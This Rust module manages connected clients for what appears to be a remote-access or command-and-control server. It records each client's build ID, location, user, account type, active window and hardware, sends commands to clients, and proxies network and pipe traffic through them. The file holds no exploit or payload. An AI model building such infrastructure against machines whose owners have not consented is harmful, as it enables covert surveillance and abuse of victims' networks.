//! Client management and registry.
//!
//! Tracks all connected clients and their state.

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::{Duration, Instant};

use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use tokio::sync::{mpsc, watch};

use crate::protocol::{CommandMessage, DriveInfo, SystemInfo, ProxyTarget};

/// Unique identifier for a client connection session
pub type SessionId = u64;

/// Proxy message to send to client
#[derive(Debug, Clone)]
pub enum ProxyMessage {
    /// Legacy TCP connect (for backwards compatibility)
    Connect { conn_id: u32, host: String, port: u16 },
    /// Unified connect with target type (TCP, local pipe, remote pipe)
    ConnectTarget { conn_id: u32, target: ProxyTarget },
    /// Data to send to target
    Data { conn_id: u32, data: Vec<u8> },
    /// Close connection
    Close { conn_id: u32 },
}

/// Client state in the registry
#[derive(Debug, Clone)]
pub struct ConnectedClient {
    /// Session ID for this connection
    pub session_id: SessionId,
    /// Unique client identifier (persistent across reconnects)
    pub uid: String,
    /// Build identifier
    pub build_id: String,
    /// Remote address
    pub remote_addr: SocketAddr,
    /// Port client connected on
    pub port: u16,
    /// Connection timestamp
    pub connected_at: Instant,
    /// Last activity timestamp
    pub last_seen: Instant,
    /// Last ping round-trip time in milliseconds
    pub ping_ms: u32,
    /// Current connection status
    pub status: ClientStatus,
    /// System information from client
    pub system_info: SystemInfo,
    /// Channel to send commands to this client's handler
    pub command_tx: mpsc::Sender<CommandMessage>,
    /// Channel to send proxy messages to this client's handler
    pub proxy_tx: Option<mpsc::Sender<ProxyMessage>>,
    /// Shutdown signal sender (send true to trigger disconnect)
    pub shutdown_tx: watch::Sender<bool>,
}

/// Client connection status
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ClientStatus {
    /// Client is connected and responsive
    Online,
    /// Client hasn't responded to recent pings
    Idle,
    /// Client is disconnecting
    Disconnecting,
}

/// Data transfer object for client info (sent to frontend)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientInfo {
    pub uid: String,
    pub ip: String,
    pub geo: String,
    pub machine: String,
    pub user: String,
    pub os: String,
    pub arch: String,
    pub build: String,
    pub status: String,
    pub connected: u64,
    pub ping: u32,
    pub account: String,
    pub uptime: String,
    pub window: String,
    pub cpu: u8,
    pub ram: u8,
    pub cpu_name: Option<String>,
    pub cpu_cores: Option<u32>,
    pub gpu_name: Option<String>,
    pub gpu_vram: Option<u64>,
    pub ram_total: Option<u64>,
    pub motherboard: Option<String>,
    pub drives: Vec<DriveInfo>,
}

impl ConnectedClient {
    /// Convert to frontend-friendly DTO
    pub fn to_info(&self) -> ClientInfo {
        let uptime_secs = self.system_info.uptime_secs;
        let uptime_str = if uptime_secs >= 86400 {
            format!("{}d {}h", uptime_secs / 86400, (uptime_secs % 86400) / 3600)
        } else if uptime_secs >= 3600 {
            format!("{}h {}m", uptime_secs / 3600, (uptime_secs % 3600) / 60)
        } else {
            format!("{}m", uptime_secs / 60)
        };

        ClientInfo {
            uid: self.uid.clone(),
            ip: self.remote_addr.ip().to_string(),
            geo: self.system_info.country.clone().unwrap_or_default(),
            machine: self.system_info.machine_name.clone(),
            user: self.system_info.username.clone(),
            os: self.system_info.os.clone(),
            arch: self.system_info.arch.clone(),
            build: self.build_id.clone(),
            status: match self.status {
                ClientStatus::Online => "online".to_string(),
                ClientStatus::Idle => "idle".to_string(),
                ClientStatus::Disconnecting => "offline".to_string(),
            },
            connected: self.connected_at.elapsed().as_millis() as u64,
            ping: self.ping_ms,
            account: self.system_info.account_type.clone(),
            uptime: uptime_str,
            window: self.system_info.active_window.clone().unwrap_or_default(),
            cpu: self.system_info.cpu_percent,
            ram: self.system_info.ram_percent,
            cpu_name: self.system_info.cpu_name.clone(),
            cpu_cores: self.system_info.cpu_cores,
            gpu_name: self.system_info.gpu_name.clone(),
            gpu_vram: self.system_info.gpu_vram,
            ram_total: self.system_info.ram_total,
            motherboard: self.system_info.motherboard.clone(),
            drives: self.system_info.drives.clone(),
        }
    }
}

/// Filter result when registering a client
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FilterResult {
    /// Client is allowed
    Allowed,
    /// Client was filtered due to duplicate UID (existing client disconnected)
    DuplicateUid,
    /// Client was rejected due to duplicate IP filter
    RejectedDuplicateIp,
    /// Client was rejected due to duplicate LAN filter
    RejectedDuplicateLan,
    /// Client was rejected due to max clients limit
    RejectedMaxClients,
}

/// Thread-safe registry of all connected clients
#[derive(Debug)]
pub struct ClientRegistry {
    /// Map of session ID to client
    clients: RwLock<HashMap<SessionId, ConnectedClient>>,
    /// Map of UID to session ID (for finding client by UID)
    uid_to_session: RwLock<HashMap<String, SessionId>>,
    /// Next session ID to assign
    next_session_id: RwLock<SessionId>,
    /// Channel to notify frontend of client changes
    event_tx: Option<mpsc::Sender<ClientEvent>>,
}

/// Events emitted by the registry
#[derive(Debug, Clone)]
pub enum ClientEvent {
    Connected(ClientInfo),
    Disconnected(ClientInfo),
    Updated(ClientInfo),
}

impl ClientRegistry {
    /// Create a new client registry
    pub fn new() -> Self {
        Self {
            clients: RwLock::new(HashMap::new()),
            uid_to_session: RwLock::new(HashMap::new()),
            next_session_id: RwLock::new(1),
            event_tx: None,
        }
    }

    /// Create registry with event channel
    pub fn with_events(event_tx: mpsc::Sender<ClientEvent>) -> Self {
        Self {
            clients: RwLock::new(HashMap::new()),
            uid_to_session: RwLock::new(HashMap::new()),
            next_session_id: RwLock::new(1),
            event_tx: Some(event_tx),
        }
    }

    /// Register a new client connection
    pub fn register(
        &self,
        uid: String,
        build_id: String,
        remote_addr: SocketAddr,
        port: u16,
        system_info: SystemInfo,
        command_tx: mpsc::Sender<CommandMessage>,
        shutdown_tx: watch::Sender<bool>,
    ) -> SessionId {
        // Check if client with this UID is already connected
        if let Some(&old_session) = self.uid_to_session.read().get(&uid) {
            // Disconnect old session - also triggers shutdown signal
            self.unregister(old_session);
        }

        // Assign new session ID
        let session_id = {
            let mut next = self.next_session_id.write();
            let id = *next;
            *next += 1;
            id
        };

        let now = Instant::now();
        let client = ConnectedClient {
            session_id,
            uid: uid.clone(),
            build_id,
            remote_addr,
            port,
            connected_at: now,
            last_seen: now,
            ping_ms: 0,
            status: ClientStatus::Online,
            system_info,
            command_tx,
            proxy_tx: None,
            shutdown_tx,
        };

        // Emit event
        if let Some(tx) = &self.event_tx {
            let _ = tx.try_send(ClientEvent::Connected(client.to_info()));
        }

        // Store client
        self.clients.write().insert(session_id, client);
        self.uid_to_session.write().insert(uid, session_id);

        println!("Client registered: session_id={}", session_id);

        session_id
    }

    /// Unregister a client connection
    pub fn unregister(&self, session_id: SessionId) -> Option<ConnectedClient> {
        let client = self.clients.write().remove(&session_id);

        if let Some(ref c) = client {
            self.uid_to_session.write().remove(&c.uid);

            // Send shutdown signal to handler
            let _ = c.shutdown_tx.send(true);

            // Emit event with full client info for notifications
            if let Some(tx) = &self.event_tx {
                let _ = tx.try_send(ClientEvent::Disconnected(c.to_info()));
            }

            println!("Client unregistered: session_id={}, uid={}", session_id, c.uid);
        }

        client
    }

    /// Update client's last seen timestamp
    pub fn update_last_seen(&self, session_id: SessionId) {
        if let Some(client) = self.clients.write().get_mut(&session_id) {
            client.last_seen = Instant::now();
            if client.status == ClientStatus::Idle {
                client.status = ClientStatus::Online;
            }
        }
    }

    /// Update client's ping
    pub fn update_ping(&self, session_id: SessionId, ping_ms: u32) {
        if let Some(client) = self.clients.write().get_mut(&session_id) {
            client.ping_ms = ping_ms;
            client.last_seen = Instant::now();
        }
    }

    /// Update client's system info
    pub fn update_system_info(&self, session_id: SessionId, info: SystemInfo) {
        let mut clients = self.clients.write();
        if let Some(client) = clients.get_mut(&session_id) {
            client.system_info = info;
            client.last_seen = Instant::now();

            // Emit event
            if let Some(tx) = &self.event_tx {
                let _ = tx.try_send(ClientEvent::Updated(client.to_info()));
            }
        }
    }

    /// Mark clients as idle if they haven't been seen recently
    pub fn check_timeouts(&self, idle_timeout: Duration, disconnect_timeout: Duration) -> Vec<SessionId> {
        let now = Instant::now();
        let mut to_disconnect = Vec::new();

        let mut clients = self.clients.write();
        for (session_id, client) in clients.iter_mut() {
            let elapsed = now.duration_since(client.last_seen);

            if elapsed > disconnect_timeout {
                to_disconnect.push(*session_id);
            } else if elapsed > idle_timeout && client.status == ClientStatus::Online {
                client.status = ClientStatus::Idle;
            }
        }

        to_disconnect
    }

    /// Get all connected clients as DTOs
    pub fn get_all_clients(&self) -> Vec<ClientInfo> {
        self.clients
            .read()
            .values()
            .map(|c| c.to_info())
            .collect()
    }

    /// Get a specific client by session ID
    pub fn get_client(&self, session_id: SessionId) -> Option<ClientInfo> {
        self.clients.read().get(&session_id).map(|c| c.to_info())
    }

    /// Get a specific client by UID
    pub fn get_client_by_uid(&self, uid: &str) -> Option<ClientInfo> {
        let session_id = *self.uid_to_session.read().get(uid)?;
        self.get_client(session_id)
    }

    /// Get command sender for a client
    pub fn get_command_sender(&self, session_id: SessionId) -> Option<mpsc::Sender<CommandMessage>> {
        self.clients.read().get(&session_id).map(|c| c.command_tx.clone())
    }

    /// Get command sender by UID
    pub fn get_command_sender_by_uid(&self, uid: &str) -> Option<mpsc::Sender<CommandMessage>> {
        let session_id = *self.uid_to_session.read().get(uid)?;
        self.get_command_sender(session_id)
    }

    /// Get total number of connected clients
    pub fn client_count(&self) -> usize {
        self.clients.read().len()
    }

    /// Get session ID by UID
    pub fn get_session_by_uid(&self, uid: &str) -> Option<SessionId> {
        self.uid_to_session.read().get(uid).copied()
    }

    /// Get UID by session ID
    pub fn get_uid_by_session(&self, session_id: SessionId) -> Option<String> {
        self.clients.read().get(&session_id).map(|c| c.uid.clone())
    }

    /// Set proxy sender for a client
    pub fn set_proxy_sender(&self, uid: &str, proxy_tx: mpsc::Sender<ProxyMessage>) -> bool {
        let session_id = match self.uid_to_session.read().get(uid).copied() {
            Some(id) => id,
            None => return false,
        };

        if let Some(client) = self.clients.write().get_mut(&session_id) {
            client.proxy_tx = Some(proxy_tx);
            true
        } else {
            false
        }
    }

    /// Clear proxy sender for a client
    pub fn clear_proxy_sender(&self, uid: &str) {
        let session_id = match self.uid_to_session.read().get(uid).copied() {
            Some(id) => id,
            None => return,
        };

        if let Some(client) = self.clients.write().get_mut(&session_id) {
            client.proxy_tx = None;
        }
    }

    /// Get proxy sender for a client
    pub fn get_proxy_sender(&self, uid: &str) -> Option<mpsc::Sender<ProxyMessage>> {
        let session_id = *self.uid_to_session.read().get(uid)?;
        self.clients.read().get(&session_id).and_then(|c| c.proxy_tx.clone())
    }

    /// Get all session IDs for clients connected on a specific port
    pub fn get_sessions_by_port(&self, port: u16) -> Vec<SessionId> {
        self.clients.read()
            .values()
            .filter(|c| c.port == port)
            .map(|c| c.session_id)
            .collect()
    }

    /// Disconnect all clients connected on a specific port
    pub fn disconnect_clients_on_port(&self, port: u16) -> usize {
        let sessions = self.get_sessions_by_port(port);
        let count = sessions.len();
        for session_id in sessions {
            self.unregister(session_id);
        }
        count
    }
}

impl Default for ClientRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl ClientRegistry {
    /// Check if a client should be filtered based on settings
    /// Returns FilterResult indicating if client is allowed or why it was rejected
    pub fn check_filters(
        &self,
        uid: &str,
        remote_ip: &std::net::IpAddr,
        local_ips: &[String],
        filter_dup_uid: bool,
        filter_dup_ip: bool,
        filter_dup_lan: bool,
        max_clients: u32,
    ) -> FilterResult {
        let clients = self.clients.read();

        // Check max clients (excluding any existing session for this UID that would be replaced)
        let current_count = if self.uid_to_session.read().contains_key(uid) {
            clients.len().saturating_sub(1) // Don't count the one we'll replace
        } else {
            clients.len()
        };

        if current_count >= max_clients as usize {
            return FilterResult::RejectedMaxClients;
        }

        // Check duplicate UID - this is handled differently (disconnect old, allow new)
        if filter_dup_uid && self.uid_to_session.read().contains_key(uid) {
            return FilterResult::DuplicateUid;
        }

        // Check duplicate IP
        if filter_dup_ip {
            let remote_ip_str = remote_ip.to_string();
            for client in clients.values() {
                if client.uid != uid && client.remote_addr.ip().to_string() == remote_ip_str {
                    return FilterResult::RejectedDuplicateIp;
                }
            }
        }

        // Check duplicate LAN IP
        if filter_dup_lan && !local_ips.is_empty() {
            for client in clients.values() {
                if client.uid != uid {
                    // Check if any local IPs match
                    for local_ip in local_ips {
                        if client.system_info.local_ips.iter().any(|ip| ip == local_ip) {
                            return FilterResult::RejectedDuplicateLan;
                        }
                    }
                }
            }
        }

        FilterResult::Allowed
    }
}

/// Shared client registry
pub type SharedClientRegistry = Arc<ClientRegistry>;
